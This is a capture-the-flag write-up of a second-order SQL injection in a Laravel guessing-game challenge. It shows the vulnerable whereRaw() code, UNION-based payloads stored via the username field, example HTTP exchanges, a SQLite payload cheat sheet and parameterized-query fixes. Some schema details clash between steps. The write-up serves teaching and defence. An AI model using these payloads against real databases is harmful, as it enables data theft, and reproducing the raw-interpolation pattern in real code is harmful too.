![img](assets/banner.png)

# Guess Royal

**Date:** 24 September 2025  
**Author:** Abderrahim El Ouariachi  
**Difficulty:** Hard



---

## Summary

A Laravel-based guessing-game application has two versions. Version 2 persists game state to a SQLite database and contains a **second-order SQL injection** introduced when the application constructs a raw WHERE clause using the authenticated user’s `name` (unescaped) — `whereRaw("user_name = '{$user->name}'")`. By injecting crafted input into the `name` field during registration (or earlier), and later triggering the `/games/history` endpoint, you can perform UNION-based extraction to read tables (including a `flags` table) and retrieve the flag.

---

## Environment

- **Framework**: The application is built with [Laravel](https://laravel.com), leveraging its modern features and ecosystem.
- **Containerization**: [Laravel Sail](https://laravel.com/docs/sail) is used to provide a lightweight Docker environment, making local development and deployment seamless.
- **Performance**: The application runs on [Laravel Octane](https://laravel.com/docs/octane) with the [FrankenPHP](https://frankenphp.dev) server. This setup allows handling requests efficiently without bootstrapping the framework on every request. 
- **Deployment**: A deployment script named [`deploy.sh`](./deploy.sh) is included at the project root. It automates the installation of dependencies, container build, and application optimization.
- **Dependency Management**:
  - On initial deployment, the `./vendor` and `./node_modules` directories do not exist.
  - The project includes a `./composer` binary, which is used to install PHP dependencies.
  - Once `vendor/` is created, all subsequent commands are run using `./vendor/bin/sail`.

---

## Difficulty

The injection is **second-order**, which makes automated discovery difficult: payloads are stored during one execution flow and only interpreted later, so passive scanners and simple fuzzers commonly miss them. I confirmed this empirically — existing fuzzers failed to trigger the vulnerability during testing. The target is hosted on a non-standard subdomain ( `beta-game-v2`) discovered by inspecting frontend assets, which increased the manual reconnaissance effort.

 Common automated exploitation tools (e.g., `sqlmap`) proved unreliable against the `history` endpoint unless their payload-placement and response-parsing logic were adapted to the application’s specific behavior.

To make the flag dynamic, please refer to `/database/seeders/DatabaseSeeder.php`, which seeds the database on each run to reduce the chances of cheating.

---

## Summary of Vulnerability

**Vulnerable code (controller):**

```php
public function history(#[CurrentUser] User $user): JsonResponse
{
    return Response::json(
        Game::whereRaw("user_name = '{$user->name}'")->get()
    );
}
```

Why this is vulnerable:

- `whereRaw()` is passed a string built by concatenating untrusted input (`$user->name`) directly into SQL.
- The application *does not* sanitize/parameterize the username.
- The username is stored earlier in the application (e.g., during registration or game creation), so payloads saved earlier get later interpreted by the `history` query — this is a **second-order SQL injection**.

---

## Reconnaissance & Enumeration

1. **Frontend analysis:** The first version’s assets (bundled JS) pointed to the existence of a second version at a subdomain (e.g., `beta-game-v2`). Inspecting the second version JS and endpoints revealed endpoints like `game/history`.
2. **Accessing v2:** Add the subdomain to `/etc/hosts` pointing to the target IP, visit the site, register an account.
3. **Confirming behavior:** Play a game to ensure history is recorded and the `/games/history` endpoint returns JSON of persisted `Game` records for the current user.

---

## Proof-of-Concept (Discovery)

Register a username containing a single quote to see whether the history endpoint breaks or returns SQL errors. Example username:

```
name' OR '1'='1
```

Then request:

```
GET /games/history
Cookie: laravel_session=...
```

If an SQL error or unexpected output appears or you can craft a UNION to inject columns, the endpoint is confirmed vulnerable.

---

## Exploitation — step-by-step

### 1) Find number of columns (UNION SELECT brute force)

If the app’s `Game::get()` returns an array of objects with a fixed structure (e.g., 8 selected columns), the UNION must match the column count. Use a username payload during registration such as:

```
username' UNION SELECT 1,2,3,4,5,6,7,8-- -
```

Then request `/games/history`. If the response returns without error and the JSON shows numbers 1..8 injected into the result, you found the right number of columns.

### 2) Find which column reflects text

Replace one numeric column with a string or a function that returns text, for example `sqlite_version()` (SQLite provides `sqlite_version()`):

```
username' UNION SELECT 1,2,3,sqlite_version(),5,6,7,8-- -
```

If the `result` or other field now contains the SQLite version string, that column is reflected.

### 3) Enumerate tables

Extract table names from `sqlite_master`:

```
username' UNION SELECT 1,2,3,name,5,6,7,8 FROM sqlite_master WHERE type='table'-- -
```

Look in the JSON output for table names; you should see a `flags` table mentioned.

### 4) Discover table schema

Get the SQL that created the `flags` table:

```
username' UNION SELECT 1,2,3,sql,5,6,7,8 FROM sqlite_master WHERE type='table' AND name='flags'-- -
```

This reveals columns such as `id`, `user_name`, `history`, `result`, `rules`, `secret`, `created_at`, `updated_at`.

### 5) Dump the flag

Use a UNION to select the desired column (e.g., `value` or `secret`):

```
username' UNION SELECT id,2,3,value,5,6,7,8 FROM flags-- -
```

Inspect the JSON response for the flag value.

---

## Example HTTP Interaction

Example request including the injection payload:

```
GET /game/store?minRange=1&maxRange=10&maxAttempts=3&username=admin'%20UNION%20SELECT%20id%2Cvalue%2C3%2C4%2C5%2C6%2C7%2C8%20from%20flags%20--%20- HTTP/1.1
Host: beta-game-v2
Cookie: guess-royal-session=...
```

Response confirming payload registration success:

```
{
    "Game Created": true
}
```

History endpoint triggering:

```
GET /games/history HTTP/1.1
Host: beta-game-v2.guessroyal.htb
Cookie: guess-royal-session=...
```

Example response showing successful exploitation and flag extraction:

```json
[{
    "id": 1,
    "user_name": 2,
    "history": 3,
    "result": "HTB{ThE_GuEss_ROyAl_MAstEr}",
    "rules": 5,
    "secret": 6,
    "created_at": "1970-01-01T00:00:07.000000Z",
    "updated_at": "1970-01-01T00:00:08.000000Z"
}]
```

---

## Remediation

Recommendations for developers:

1. **Never interpolate untrusted input into raw SQL.** Use parameter binding or the query builder’s parameterized methods:

```php
Game::where('user_name', $user->name)->get();
```

2. **Prefer Eloquent / parameterized queries** instead of `whereRaw()` with string concatenation.

3. **Validate and sanitize username input** at the time of registration (length, allowed characters). But validation alone is not sufficient — parameterized queries are required.

4. **Use prepared statements** or bindings with `whereRaw()` if raw expressions are needed:

```php
Game::whereRaw('user_name = ?', [$user->name])->get();
```

5. **Escape stored values** before using them in SQL contexts (defense in depth).

6. **Principle of least privilege:** the application DB user should have minimal permissions.

---

## Lessons Learned

- Frontend code can reveal hidden endpoints or subdomains.
- Second-order SQL injection is easy to miss — payloads stored earlier may later be interpreted unsafely.
- Always use parameterized queries and avoid raw SQL constructed from user data.

---

## Appendix A — Quick Payload Cheat Sheet (SQLite)

- Column discovery: `' UNION SELECT 1,2,3,4-- -`
- Reflective column test: `' UNION SELECT 1,2,sqlite_version(),4-- -`
- List tables: `' UNION SELECT 1,2,3,name,5 FROM sqlite_master WHERE type='table'-- -`
- Table SQL: `' UNION SELECT 1,2,3,sql,5 FROM sqlite_master WHERE name='flags'-- -`
- Dump table: `' UNION SELECT id,2,3,value,5 FROM flags-- -`

---

## References & Further Reading

- [Laravel Eloquent docs — Querying & bindings](https://laravel.com/docs/12.x/queries) — Laravel’s official documentation on the query builder, including parameter binding.  
- [OWASP — SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) — Guidance by OWASP to prevent SQL injection vulnerabilities.  
- [SQLite — System functions (e.g., `sqlite_version()`)](https://www.sqliz.com/sqlite-ref/system-function/) — Reference for SQLite built-in functions, including `sqlite_version()`.  

---

**End of writeup.**
